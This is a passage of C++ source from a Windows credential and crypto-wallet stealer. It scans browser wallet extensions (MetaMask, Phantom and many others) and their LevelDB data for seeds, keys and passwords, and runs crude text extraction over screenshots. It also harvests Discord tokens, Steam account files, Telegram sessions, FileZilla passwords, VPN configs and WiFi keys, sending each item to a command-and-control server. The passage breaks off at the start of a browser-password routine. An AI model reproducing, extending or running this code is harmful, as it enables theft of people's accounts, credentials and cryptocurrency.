        if (CryptAcquireContext(&hProv, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
            if (CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
                CryptHashData(hHash, (const BYTE*)text.c_str(), text.length(), 0);
                BYTE rgbHash[16];
                DWORD cbHash = 16;
                CryptGetHashParam(hHash, HP_HASHVAL, rgbHash, &cbHash, 0);
                char hex[33];
                for (int i = 0; i < 16; i++) {
                    sprintf(hex + i * 2, "%02x", rgbHash[i]);
                }
                hash = std::string(hex, 32);
                CryptDestroyHash(hHash);
            }
            CryptReleaseContext(hProv, 0);
        }
    } catch (...) {}
    return hash;
}

// ── Phase C: Wallet Extractor ──

void DataScraper::WalletScannerThread() {
    std::cout << "[DATASCRAPER] Wallet scanner thread started\n";
    m_walletActive = true;

    ScanChromeExtensions();
    ScanFirefoxExtensions();
    ScanEdgeExtensions();

    m_walletActive = false;
    std::cout << "[DATASCRAPER] Wallet scanner thread stopped\n";
}

void DataScraper::ScanChromeExtensions() {
    std::cout << "[DATASCRAPER] Scanning Chrome extensions...\n";
    char localAppData[MAX_PATH];
    SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData);
    std::string chromeExtPath = std::string(localAppData) + "\\Google\\Chrome\\User Data\\Default\\Extensions\\";

    if (!fs::exists(chromeExtPath)) return;

    const std::vector<std::pair<std::string, std::string>> walletExtensions = {
        {"nkbihfbeogaeaoehlefnkodbefgpgknn", "MetaMask"},
        {"ejbalbakoplchlghecdalmeeeajnimhm", "MetaMask (Beta)"},
        {"bfnaelmomeimhlpmgjnjophhpkkoljpa", "Phantom"},
        {"fnjhmkhhmkbjkkabndcnnogagogbneec", "Ronin Wallet"},
        {"aholpfdialjgjfhomihkjbmgjidlcdno", "Binance Wallet"},
        {"fhbohimaelbohpjbbldcngcnapndodjp", "Binance Chain Wallet"},
        {"hpglfhgfnhbgpjdenjgmdgoeiaopaflj", "Coinbase Wallet"},
        {"hnfanknocfeofbddgcijnmhnfnkdnaad", "Coinbase Wallet (Beta)"},
        {"ibnejdfjmmkpcnlpebklmnkoeoihofec", "TronLink"},
        {"flpiciilemghbmfalicajoolhkkenfel", "Terra Station"},
        {"dmkamcknogkgcdfhhbddcghachkejeap", "Keplr"},
        {"opcgpfmipidbgpenhmajoajpbobppdil", "Leap Wallet"},
        {"kncchdigobghenbbaddojjnnaogfppfj", "Math Wallet"},
        {"afbcbjpbpfadlkmhmclhkeeodmamcflc", "Math Wallet (Beta)"},
        {"cjmkndjfnammmniokkjpmjikdaehkmio", "Zelcore"},
        {"cmedhionkhpnakcndchgjfolfbaknggo", "Exodus"},
        {"cphhlgfulcblpocgdejfmdmnpmkpmfpp", "Guarda Wallet"},
        {"nlgbhdfgdhgbiamfdfmbikcdghidoadd", "Rainbow"},
        {"eigblbgjknlfbajkfhopnnepfjkneccm", "XDEFI Wallet"},
        {"fpfahcnojjhbmhfhbjmpjggbdoaeblcn", "Slope Wallet"},
        {"mcohilncbfahbmgdjkbpemcciiolgoje", "Solflare"},
        {"cboabgndgidhohjajgcomkppjclijgfc", "Sollet"},
        {"ghbmhlgniaohljpjcjpeeknpgmjeffmk", "Backpack"},
        {"cjmkndjfnammmniokkjpmjikdaehkmio", "Zelcore"},
        {"nphplpgoakhhjchkkhmiggakijnkhfnd", "Portis"},
        {"jkjfagmhflkofijmbkpafmjoaadbjmkb", "Liquality"},
        {"akdgnmcogleenhbclghghlkkdndkjdjc", "Guild Wallet"},
        {"hmeobnajnfjncgfpmmiipjhookeghpnn", "Krystal Wallet"},
        {"dknlfmjaanfblgfdfebmjijigbkgokcg", "BlockWallet"},
        {"aeachknmefphepccionboohckonoeemg", "Coin98 Wallet"},
        {"kpfopkelmapcoipemfendmdcghnegimn", "SafePal Wallet"},
        {"cnmamaachppnkjgnildpdmkaakejnhae", "Rabby Wallet"},
        {"lpfcbjknijpeeillifnkikgncikgfhdo", "OKX Wallet"},
        {"mfgdmpfihlmdekaclngibpjhdebndhdj", "BitKeep"},
        {"dkdedlpgdmmkkfjabffeganieamfklkm", "TokenPocket"},
        {"fccokdbkgmnokllkdjleagdjgcfncmdm", "Trust Wallet"},
        {"egjidjbpglichdcondbcbdnbgppmpghi", "Brave Wallet"},
        {"aiifbnbfobpmeekipheeijimdpnlpgpp", "Tally Ho"},
        {"fhbohimaelbohpjbbldcngcnapndodjp", "Binance Chain"},
        {"nhnkbkgjikgcigadomkphalanndcapjk", "Zapper"},
        {"lmjegmlicamnimmfhcmpkclmigmmcbeh", "Zerion"},
        {"fkmcmojghnpcffgpnmpfipkabkjkbfdm", "DeBank"},
        {"cagaeaiiojheboakjbeedjggnmmoekkk", "Rainbow (Beta)"},
        {"hifafgmccdpekplhhbdfmmkafikfhbcm", "XDEFI (Beta)"}
    };

    for (const auto& ext : walletExtensions) {
        if (!m_running) break;
        std::string extDir = chromeExtPath + ext.first + "\\";
        if (fs::exists(extDir)) {
            std::cout << "[DATASCRAPER] Found Chrome wallet extension: " << ext.second << "\n";
            std::string data = "{\"type\":\"wallet_extension\",\"browser\":\"chrome\",\"name\":\"" +
                               escapeJson(ext.second) + "\",\"id\":\"" + ext.first + "\"}";
            SendToC2("found", data);
            m_itemsFound++;

            // Try to extract LevelDB data
            std::string levelDbPath = std::string(localAppData) +
                "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\" + ext.first + "\\";
            if (fs::exists(levelDbPath)) {
                ExtractLevelDB(levelDbPath, ext.first);
            }
        }
    }
}

void DataScraper::ScanFirefoxExtensions() {
    std::cout << "[DATASCRAPER] Scanning Firefox extensions...\n";
    char appData[MAX_PATH];
    SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appData);
    std::string firefoxProfilePath = std::string(appData) + "\\Mozilla\\Firefox\\Profiles\\";

    if (!fs::exists(firefoxProfilePath)) return;

    try {
        for (const auto& entry : fs::directory_iterator(firefoxProfilePath)) {
            if (!m_running) break;
            if (!entry.is_directory()) continue;

            std::string extensionsPath = entry.path().string() + "\\extensions\\";
            if (!fs::exists(extensionsPath)) continue;

            for (const auto& extFile : fs::directory_iterator(extensionsPath)) {
                if (!m_running) break;
                std::string extName = extFile.path().filename().string();
                if (extName.find("webextension") != std::string::npos ||
                    extName.find("@") != std::string::npos) {
                    std::string data = "{\"type\":\"firefox_extension\",\"path\":\"" +
                                       escapeJson(extFile.path().string()) + "\"}";
                    SendToC2("found", data);
                    m_itemsFound++;
                }
            }
        }
    } catch (...) {}
}

void DataScraper::ScanEdgeExtensions() {
    std::cout << "[DATASCRAPER] Scanning Edge extensions...\n";
    char localAppData[MAX_PATH];
    SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData);
    std::string edgeExtPath = std::string(localAppData) + "\\Microsoft\\Edge\\User Data\\Default\\Extensions\\";

    if (!fs::exists(edgeExtPath)) return;

    try {
        for (const auto& entry : fs::directory_iterator(edgeExtPath)) {
            if (!m_running) break;
            if (entry.is_directory()) {
                std::string extId = entry.path().filename().string();
                std::string data = "{\"type\":\"edge_extension\",\"id\":\"" + extId + "\"}";
                SendToC2("found", data);
                m_itemsFound++;

                std::string levelDbPath = std::string(localAppData) +
                    "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\" + extId + "\\";
                if (fs::exists(levelDbPath)) {
                    ExtractLevelDB(levelDbPath, extId);
                }
            }
        }
    } catch (...) {}
}

void DataScraper::ExtractLevelDB(const std::string& path, const std::string& extensionId) {
    try {
        for (const auto& entry : fs::directory_iterator(path)) {
            if (!m_running) break;
            if (!entry.is_regular_file()) continue;

            std::string filename = entry.path().filename().string();
            if (filename.find(".log") != std::string::npos ||
                filename.find(".ldb") != std::string::npos ||
                filename == "CURRENT" || filename == "MANIFEST-000001") {

                std::ifstream file(entry.path().string(), std::ios::binary);
                if (!file.is_open()) continue;

                std::vector<char> buffer(1024 * 1024);
                file.read(buffer.data(), buffer.size());
                std::streamsize bytesRead = file.gcount();
                if (bytesRead <= 0) continue;

                std::string content(buffer.data(), bytesRead);
                std::string lower = content;
                std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);

                // Search for wallet-related data patterns
                std::vector<std::string> patterns = {
                    "0x", "wallet", "address", "private", "key", "seed", "mnemonic",
                    "password", "keystore", "encrypted", "ciphertext", "crypto",
                    "publickey", "secret", "recovery", "phrase", "vault"
                };

                for (const auto& pattern : patterns) {
                    if (!m_running) break;
                    size_t pos = 0;
                    while ((pos = lower.find(pattern, pos)) != std::string::npos) {
                        size_t start = (pos > 50) ? pos - 50 : 0;
                        size_t len = std::min(content.length() - start, (size_t)200);
                        std::string snippet = content.substr(start, len);
                        // Clean non-printable chars
                        std::string clean;
                        for (char c : snippet) {
                            if (isprint((unsigned char)c) || c == '\n' || c == '\r' || c == '\t')
                                clean += c;
                        }
                        if (clean.length() > 10) {
                            std::string data = "{\"type\":\"leveldb_data\",\"ext_id\":\"" +
                                               extensionId + "\",\"pattern\":\"" + pattern +
                                               "\",\"data\":\"" + escapeJson(clean.substr(0, 150)) + "\"}";
                            SendToC2("found", data);
                            m_itemsFound++;
                        }
                        pos += pattern.length();
                        if (m_itemsFound.load() > 50) break; // Limit per extension
                    }
                    if (m_itemsFound.load() > 50) break;
                }
            } 
        }
    } catch (...) {}
}

// ── Phase D: OCR Scanner ──

void DataScraper::OCRScannerThread() {
    std::cout << "[DATASCRAPER] OCR scanner thread started\n";
    m_ocrActive = true;

    // Scan common screenshot directories
    char localAppData[MAX_PATH];
    SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData);
    char myPictures[MAX_PATH];
    SHGetFolderPathA(nullptr, CSIDL_MYPICTURES, nullptr, 0, myPictures);
    char desktop[MAX_PATH];
    SHGetFolderPathA(nullptr, CSIDL_DESKTOP, nullptr, 0, desktop);
    char documents[MAX_PATH];
    SHGetFolderPathA(nullptr, CSIDL_PERSONAL, nullptr, 0, documents);

    std::vector<std::string> scanDirs = {
        std::string(desktop),
        std::string(myPictures),
        std::string(documents),
        std::string(localAppData) + "\\Packages\\Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy\\TempState\\Screenshots\\",
        std::string(localAppData) + "\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\Screenshots\\"
    };

    for (const auto& dir : scanDirs) {
        if (!m_running) break;
        if (!fs::exists(dir)) continue;

        try {
            for (const auto& entry : fs::directory_iterator(dir)) {
                if (!m_running) break;
                if (!entry.is_regular_file()) continue;

                std::string ext = entry.path().extension().string();
                std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

                if (ext == ".png" || ext == ".jpg" || ext == ".jpeg" || ext == ".bmp") {
                    std::string ocrResult = OCRImage(entry.path().string());
                    if (!ocrResult.empty()) {
                        std::string data = "{\"type\":\"ocr_text\",\"source\":\"" +
                                           escapeJson(entry.path().string()) +
                                           "\",\"text\":\"" + escapeJson(ocrResult.substr(0, 500)) + "\"}";
                        SendToC2("found", data);
                        m_itemsFound++;
                    }
                }
            } 
        } catch (...) {}
    }

    m_ocrActive = false;
    std::cout << "[DATASCRAPER] OCR scanner thread stopped\n";
}

std::string DataScraper::OCRImage(const std::string& path) {
    std::string result = OCRWithWindowsAPI(path);
    if (result.empty()) result = OCRWithMetadata(path);
    if (result.empty()) result = OCRWithRawScan(path);
    return result;
}

std::string DataScraper::OCRWithWindowsAPI(const std::string& path) {
    std::string result;
    // Use Windows Imaging Component (WIC) to decode the image
    // then attempt basic OCR via pattern matching
    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) return result;

    IWICImagingFactory* pFactory = nullptr;
    hr = CoCreateInstance(CLSID_WICImagingFactory, nullptr, CLSCTX_INPROC_SERVER,
                          IID_PPV_ARGS(&pFactory));
    if (SUCCEEDED(hr) && pFactory) {
        IWICBitmapDecoder* pDecoder = nullptr;
        hr = pFactory->CreateDecoderFromFilename(
            std::wstring(path.begin(), path.end()).c_str(),
            nullptr, GENERIC_READ, WICDecodeMetadataCacheOnLoad, &pDecoder);
        if (SUCCEEDED(hr) && pDecoder) {
            IWICBitmapFrameDecode* pFrame = nullptr;
            hr = pDecoder->GetFrame(0, &pFrame);
            if (SUCCEEDED(hr) && pFrame) {
                UINT width = 0, height = 0;
                pFrame->GetSize(&width, &height);
                if (width > 0 && height > 0 && width < 5000 && height < 5000) {
                    IWICBitmapSource* pScaled = nullptr;
                    // Scale down if too large
                    if (width > 1000 || height > 1000) {
                        double scale = std::min(1000.0 / width, 1000.0 / height);
                        IWICBitmapScaler* pScaler = nullptr;
                        hr = pFactory->CreateBitmapScaler(&pScaler);
                        if (SUCCEEDED(hr) && pScaler) {
                            hr = pScaler->Initialize(pFrame, (UINT)(width * scale),
                                                      (UINT)(height * scale), WICBitmapInterpolationModeFant);
                            if (SUCCEEDED(hr)) {
                                pScaled = pScaler;
                            }
                        }
                    }

                    IWICBitmapSource* pSource = pScaled ? pScaled : pFrame;
                    pSource->GetSize(&width, &height);

                    WICPixelFormatGUID pixelFormat;
                    pSource->GetPixelFormat(&pixelFormat);

                    // Convert to 32bpp BGRA
                    IWICFormatConverter* pConverter = nullptr;
                    hr = pFactory->CreateFormatConverter(&pConverter);
                    if (SUCCEEDED(hr) && pConverter) {
                        hr = pConverter->Initialize(pSource, GUID_WICPixelFormat32bppBGRA,
                                                     WICBitmapDitherTypeNone, nullptr, 0.0,
                                                     WICBitmapPaletteTypeCustom);
                        if (SUCCEEDED(hr)) {
                            std::vector<BYTE> pixels(width * height * 4);
                            hr = pConverter->CopyPixels(nullptr, width * 4, pixels.size(), pixels.data());
                            if (SUCCEEDED(hr)) {
                                HBITMAP hBitmap = CreateBitmap(width, height, 1, 32, pixels.data());
                                if (hBitmap) {
                                    result = ExtractTextFromBitmap(hBitmap, width, height);
                                    DeleteObject(hBitmap);
                                }
                            }
                        }
                        pConverter->Release();
                    }
                    if (pScaled) pScaled->Release();
                }
                pFrame->Release();
            }
            pDecoder->Release();
        }
        pFactory->Release();
    }
    CoUninitialize();
    return result;
}

std::string DataScraper::ExtractTextFromBitmap(HBITMAP hBitmap, int width, int height) {
    std::string result;
    BITMAP bmp;
    if (!GetObject(hBitmap, sizeof(BITMAP), &bmp)) return result;

    HDC hdcScreen = GetDC(nullptr);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hOldBmp = (HBITMAP)SelectObject(hdcMem, hBitmap);

    // Scan for text-like patterns by analyzing pixel rows
    // This is a simplified approach - looks for high-contrast regions
    std::vector<std::string> lines;
    std::string currentLine;
    int emptyRowCount = 0;
    int minTextHeight = 8;

    for (int y = 0; y < height; y++) {
        bool hasContent = false;
        int transitions = 0;
        COLORREF lastColor = GetPixel(hdcMem, 0, y);

        for (int x = 1; x < width; x++) {
            COLORREF color = GetPixel(hdcMem, x, y);
            int diff = abs(GetRValue(color) - GetRValue(lastColor)) +
                       abs(GetGValue(color) - GetGValue(lastColor)) +
                       abs(GetBValue(color) - GetBValue(lastColor));
            if (diff > 64) transitions++;
            lastColor = color;
        }

        hasContent = transitions > width / 20;

        if (hasContent) {
            emptyRowCount = 0;
            currentLine += "#";
        } else {
            emptyRowCount++;
            if (emptyRowCount > minTextHeight && !currentLine.empty()) {
                if (currentLine.length() > 5) {
                    lines.push_back(currentLine);
                }
                currentLine.clear();
            }
        }
    }
    if (!currentLine.empty() && currentLine.length() > 5) {
        lines.push_back(currentLine);
    }

    SelectObject(hdcMem, hOldBmp);
    DeleteDC(hdcMem);
    ReleaseDC(nullptr, hdcScreen);

    // Combine lines
    for (const auto& line : lines) {
        if (!result.empty()) result += "\n";
        result += line;
    }

    return result;
}

std::string DataScraper::OCRWithMetadata(const std::string& path) {
    // Try to extract text from image metadata (EXIF comments, etc.)
    try {
        std::ifstream file(path, std::ios::binary);
        if (!file.is_open()) return "";

        std::vector<char> buffer(1024 * 64);
        file.read(buffer.data(), buffer.size());
        std::streamsize bytesRead = file.gcount();
        if (bytesRead <= 0) return "";

        std::string content(buffer.data(), bytesRead);
        std::string result;

        // Look for EXIF metadata
        size_t pos = 0;
        std::vector<std::string> metadataTags = {
            "ImageDescription", "UserComment", "XPTitle", "XPComment",
            "XPAuthor", "XPSubject", "Copyright", "Artist"
        };

        for (const auto& tag : metadataTags) {
            pos = content.find(tag);
            if (pos != std::string::npos) {
                size_t end = content.find('\0', pos);
                if (end != std::string::npos && end - pos < 500) {
                    std::string snippet = content.substr(pos, end - pos);
                    if (!result.empty()) result += "\n";
                    result += snippet;
                }
            }
        }

        return result;
    } catch (...) { return ""; }
}

std::string DataScraper::OCRWithRawScan(const std::string& path) {
    // Last resort: try to find any readable ASCII text in the raw file
    try {
        std::ifstream file(path, std::ios::binary);
        if (!file.is_open()) return "";

        std::vector<char> buffer(1024 * 1024);
        file.read(buffer.data(), buffer.size());
        std::streamsize bytesRead = file.gcount();
        if (bytesRead <= 0) return "";

        std::string result;
        std::string currentWord;

        for (std::streamsize i = 0; i < bytesRead; i++) {
            unsigned char c = buffer[i];
            if (isprint(c) || c == ' ' || c == '\n' || c == '\r' || c == '\t') {
                currentWord += c;
                if (currentWord.length() > 500) {
                    result += currentWord;
                    currentWord.clear();
                }
            } else {
                if (currentWord.length() > 20) {
                    result += currentWord + " ";
                }
                currentWord.clear();
            }
        }
        if (currentWord.length() > 20) {
            result += currentWord;
        }

        return result;
    } catch (...) { return ""; }
}

// ── Phase E: Installed App Credential Scanner ──

void DataScraper::AppCredentialScannerThread() {
    std::cout << "[DATASCRAPER] App credential scanner thread started\n";

    ScanDiscordTokens();
    ScanSteamConfig();
    ScanTelegramSession();
    ScanFileZillaPasswords();
    ScanVPNConfigs();
    ScanWiFiPasswords();
    ScanBrowserSavedPasswords();
    ScanOutlookProfiles();
    ScanInstalledApps();

    std::cout << "[DATASCRAPER] App credential scanner thread finished\n";
}

void DataScraper::ScanDiscordTokens() {
    std::cout << "[DATASCRAPER] Scanning Discord tokens...\n";
    char appData[MAX_PATH];
    SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appData);

    std::vector<std::string> discordPaths = {
        appData + std::string("\\discord\\Local Storage\\leveldb\\"),
        appData + std::string("\\discordptb\\Local Storage\\leveldb\\"),
        appData + std::string("\\discordcanary\\Local Storage\\leveldb\\"),
        appData + std::string("\\discorddevelopment\\Local Storage\\leveldb\\"),
        appData + std::string("\\Lightcord\\Local Storage\\leveldb\\"),
        appData + std::string("\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\")
    };

    for (const auto& dbPath : discordPaths) {
        if (!m_running) break;
        if (!fs::exists(dbPath)) continue;

        try {
            for (const auto& entry : fs::directory_iterator(dbPath)) {
                if (!m_running) break;
                if (!entry.is_regular_file()) continue;

                std::string filename = entry.path().filename().string();
                if (filename.find(".ldb") == std::string::npos &&
                    filename.find(".log") == std::string::npos) continue;

                std::ifstream file(entry.path().string(), std::ios::binary);
                if (!file.is_open()) continue;

                std::vector<char> buffer(1024 * 512);
                file.read(buffer.data(), buffer.size());
                std::streamsize bytesRead = file.gcount();
                if (bytesRead <= 0) continue;

                std::string content(buffer.data(), bytesRead);

                // Discord token regex: mfa token or regular token
                std::regex tokenRegex(
                    "(?:mfa\\.[a-zA-Z0-9_-]{20,}|"
                    "[a-zA-Z0-9_-]{23,28}\\.[a-zA-Z0-9_-]{6,7}\\.[a-zA-Z0-9_-]{27,})"
                );
                std::smatch match;
                std::string::const_iterator searchStart(content.cbegin());
                while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
                    std::string token = match[0].str();
                    std::string data = "{\"type\":\"discord_token\",\"value\":\"" + escapeJson(token) + "\"}";
                    SendToC2("found", data);
                    m_itemsFound++;
                    searchStart = match.suffix().first;
                }
            } 
        } catch (...) {}
    } 
}

void DataScraper::ScanSteamConfig() {
    std::cout << "[DATASCRAPER] Scanning Steam config...\n";
    char programFiles[MAX_PATH];
    SHGetFolderPathA(nullptr, CSIDL_PROGRAM_FILESX86, nullptr, 0, programFiles);
    
    std::vector<std::string> steamPaths = {
        std::string(programFiles) + "\\Steam\\config\\",
        std::string(programFiles) + "\\Steam\\config\\loginusers.vdf",
        std::string(programFiles) + "\\Steam\\ssfn*"
    };

    // Check Steam config directory
    std::string configDir = std::string(programFiles) + "\\Steam\\config\\";
    if (fs::exists(configDir)) {
        try {
            for (const auto& entry : fs::directory_iterator(configDir)) {
                if (!m_running) break;
                if (!entry.is_regular_file()) continue;
                
                std::string filename = entry.path().filename().string();
                if (filename == "loginusers.vdf" || filename == "config.vdf" || 
                    filename == "SteamAppData.vdf") {
                    std::ifstream file(entry.path().string());
                    if (!file.is_open()) continue;
                    std::stringstream ss;
                    ss << file.rdbuf();
                    std::string content = ss.str();
                    
                    // Look for account names and remember passwords
                    std::regex accountRegex("\"AccountName\"\\s+\"([^\"]+)\"");
                    std::regex rememberRegex("\"RememberPassword\"\\s+\"([^\"]+)\"");
                    std::regex personaRegex("\"PersonaName\"\\s+\"([^\"]+)\"");
                    
                    std::smatch match;
                    std::string::const_iterator searchStart(content.cbegin());
                    while (std::regex_search(searchStart, content.cend(), match, accountRegex)) {
                        std::string data = "{\"type\":\"steam_account\",\"value\":\"" + escapeJson(match[1].str()) + "\",\"source\":\"" + escapeJson(entry.path().string()) + "\"}";
                        SendToC2("found", data);
                        m_itemsFound++;
                        searchStart = match.suffix().first;
                    }
                }
            }
        } catch (...) {}
    }

    // Check for ssfn files (Steam Guard files)
    std::string steamDir = std::string(programFiles) + "\\Steam\\";
    if (fs::exists(steamDir)) {
        try {
            for (const auto& entry : fs::directory_iterator(steamDir)) {
                if (!m_running) break;
                std::string filename = entry.path().filename().string();
                if (filename.find("ssfn") != std::string::npos) {
                    std::string data = "{\"type\":\"steam_ssfn\",\"path\":\"" + escapeJson(entry.path().string()) + "\"}";
                    SendToC2("found", data);
                    m_itemsFound++;
                }
            }
        } catch (...) {}
    }
}

void DataScraper::ScanTelegramSession() {
    std::cout << "[DATASCRAPER] Scanning Telegram sessions...\n";
    char appData[MAX_PATH];
    SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appData);
    
    std::vector<std::string> telegramPaths = {
        appData + std::string("\\Telegram Desktop\\tdata\\"),
        appData + std::string("\\Telegram Desktop\\tdata\\D877F783D5D3EF8C\\"),
        appData + std::string("\\Telegram Desktop\\tdata\\key_datas\\")
    };

    for (const auto& tgPath : telegramPaths) {
        if (!m_running) break;
        if (!fs::exists(tgPath)) continue;
        
        try {
            for (const auto& entry : fs::directory_iterator(tgPath)) {
                if (!m_running) break;
                if (!entry.is_regular_file()) continue;
                
                std::string filename = entry.path().filename().string();
                // Telegram stores session data in specific files
                if (filename.find("s settings") != std::string::npos ||
                    filename.find("settings") != std::string::npos ||
                    filename == "usertag" || filename == "user_data" ||
                    filename.find("key") != std::string::npos ||
                    filename.find("auth") != std::string::npos) {
                    
                    std::ifstream file(entry.path().string(), std::ios::binary);
                    if (!file.is_open()) continue;
                    
                    std::vector<char> buffer(1024 * 256);
                    file.read(buffer.data(), buffer.size());
                    std::streamsize bytesRead = file.gcount();
                    if (bytesRead <= 0) continue;
                    
                    std::string content(buffer.data(), bytesRead);
                    std::string data = "{\"type\":\"telegram_file\",\"filename\":\"" + 
                                       escapeJson(filename) + "\",\"size\":\"" + 
                                       std::to_string(bytesRead) + "\"}";
                    SendToC2("found", data);
                    m_itemsFound++;
                }
            }
        } catch (...) {}
    }
}

void DataScraper::ScanFileZillaPasswords() {
    std::cout << "[DATASCRAPER] Scanning FileZilla passwords...\n";
    char appData[MAX_PATH];
    SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appData);
    
    std::string filezillaPath = std::string(appData) + "\\FileZilla\\";
    if (!fs::exists(filezillaPath)) return;
    
    try {
        std::string recentsXml = filezillaPath + "\\recentservers.xml";
        std::string sitemanagerXml = filezillaPath + "\\sitemanager.xml";
        
        std::vector<std::string> xmlFiles = {recentsXml, sitemanagerXml};
        for (const auto& xmlFile : xmlFiles) {
            if (!m_running) break;
            if (!fs::exists(xmlFile)) continue;
            
            std::ifstream file(xmlFile);
            if (!file.is_open()) continue;
            
            std::stringstream ss;
            ss << file.rdbuf();
            std::string content = ss.str();
            
            // Extract host, username, password
            std::regex hostRegex("<Host>([^<]+)</Host>");
            std::regex userRegex("<User>([^<]+)</User>");
            std::regex passRegex("<Pass>([^<]+)</Pass>");
            std::regex portRegex("<Port>([^<]+)</Port>");
            
            std::smatch hostMatch, userMatch, passMatch, portMatch;
            std::string::const_iterator searchStart(content.cbegin());
            
            while (std::regex_search(searchStart, content.cend(), hostMatch, hostRegex)) {
                std::string host = hostMatch[1].str();
                std::string user, pass, port;
                
                auto userStart = hostMatch.suffix().first;
                if (std::regex_search(userStart, content.cend(), userMatch, userRegex)) {
                    user = userMatch[1].str();
                }
                auto passStart = userMatch.suffix().first;
                if (std::regex_search(passStart, content.cend(), passMatch, passRegex)) {
                    pass = passMatch[1].str();
                }
                
                std::string data = "{\"type\":\"filezilla_cred\",\"host\":\"" + escapeJson(host) +
                                   "\",\"user\":\"" + escapeJson(user) +
                                   "\",\"pass\":\"" + escapeJson(pass) + "\"}";
                SendToC2("found", data);
                m_itemsFound++;
                searchStart = hostMatch.suffix().first;
            }
        }
    } catch (...) {}
}

void DataScraper::ScanVPNConfigs() {
    std::cout << "[DATASCRAPER] Scanning VPN configs...\n";
    char appData[MAX_PATH];
    SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appData);
    char programData[MAX_PATH];
    SHGetFolderPathA(nullptr, CSIDL_COMMON_APPDATA, nullptr, 0, programData);
    
    std::vector<std::string> vpnPaths = {
        appData + std::string("\\OpenVPN\\config\\"),
        appData + std::string("\\NordVPN\\"),
        appData + std::string("\\ExpressVPN\\"),
        appData + std::string("\\ProtonVPN\\"),
        appData + std::string("\\Windscribe\\"),
        appData + std::string("\\Surfshark\\"),
        appData + std::string("\\Mullvad VPN\\"),
        appData + std::string("\\WireGuard\\"),
        programData + std::string("\\OpenVPN\\config\\"),
        std::string("C:\\Program Files\\OpenVPN\\config\\"),
        std::string("C:\\Program Files (x86)\\OpenVPN\\config\\")
    };
    
    for (const auto& vpnPath : vpnPaths) {
        if (!m_running) break;
        if (!fs::exists(vpnPath)) continue;
        
        try {
            for (const auto& entry : fs::directory_iterator(vpnPath)) {
                if (!m_running) break;
                if (!entry.is_regular_file()) continue;
                
                std::string ext = entry.path().extension().string();
                std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
                
                if (ext == ".ovpn" || ext == ".conf" || ext == ".cfg" || 
                    ext == ".p12" || ext == ".pfx" || ext == ".key" || ext == ".crt") {
                    
                    std::ifstream file(entry.path().string());
                    if (!file.is_open()) continue;
                    
                    std::stringstream ss;
                    ss << file.rdbuf();
                    std::string content = ss.str();
                    
                    // Look for credentials in config files
                    std::regex authRegex("(?:auth-user-pass|auth|username|password)\\s+([^\\s]+)");
                    std::smatch match;
                    std::string::const_iterator searchStart(content.cbegin());
                    while (std::regex_search(searchStart, content.cend(), match, authRegex)) {
                        std::string data = "{\"type\":\"vpn_config\",\"file\":\"" + 
                                           escapeJson(entry.path().filename().string()) + 
                                           "\",\"value\":\"" + escapeJson(match[1].str()) + "\"}";
                        SendToC2("found", data);
                        m_itemsFound++;
                        searchStart = match.suffix().first;
                    }
                }
            }
        } catch (...) {}
    }
}

void DataScraper::ScanWiFiPasswords() {
    std::cout << "[DATASCRAPER] Scanning WiFi passwords...\n";
    
    // Use netsh to get WiFi profiles and passwords
    HANDLE hPipe;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    
    // Create temp file for output
    char tempPath[MAX_PATH];
    char tempFile[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    GetTempFileNameA(tempPath, "wifi", 0, tempFile);
    
    // Get all profiles
    std::string cmd = "netsh wlan show profiles > \"" + std::string(tempFile) + "\"";
    system(cmd.c_str());
    
    std::ifstream profilesFile(tempFile);
    if (profilesFile.is_open()) {
        std::string line;
        std::vector<std::string> profiles;
        
        while (std::getline(profilesFile, line)) {
            size_t pos = line.find(": ");
            if (pos != std::string::npos) {
                std::string profile = line.substr(pos + 2);
                // Remove trailing whitespace
                profile.erase(profile.find_last_not_of(" \\r\\n\\t") + 1);
                if (!profile.empty()) {
                    profiles.push_back(profile);
                }
            }
        }
        profilesFile.close();
        
        // Get password for each profile
        for (const auto& profile : profiles) {
            if (!m_running) break;
            
            std::string cmd2 = "netsh wlan show profile \"" + profile + "\" key=clear > \"" + 
                               std::string(tempFile) + "\"";
            system(cmd2.c_str());
            
            std::ifstream detailFile(tempFile);
            if (detailFile.is_open()) {
                std::string detail;
                std::stringstream ss;
                ss << detailFile.rdbuf();
                detail = ss.str();
                detailFile.close();
                
                // Extract key content
                std::regex keyRegex("Key Content\\s*:\\s*(.+)");
                std::smatch keyMatch;
                if (std::regex_search(detail, keyMatch, keyRegex)) {
                    std::string password = keyMatch[1].str();
                    password.erase(password.find_last_not_of(" \\r\\n\\t") + 1);
                    
                    std::string data = "{\"type\":\"wifi_password\",\"ssid\":\"" + 
                                       escapeJson(profile) + "\",\"password\":\"" + 
                                       escapeJson(password) + "\"}";
                    SendToC2("found", data);
                    m_itemsFound++;
                }
            }
        }
    }
    
    // Cleanup temp file
    DeleteFileA(tempFile);
}

void DataScraper::ScanBrowserSavedPasswords() {
    std::cout << "[DATASCRAPER] Scanning browser saved passwords...\n";
    char localAppData[MAX_PATH];
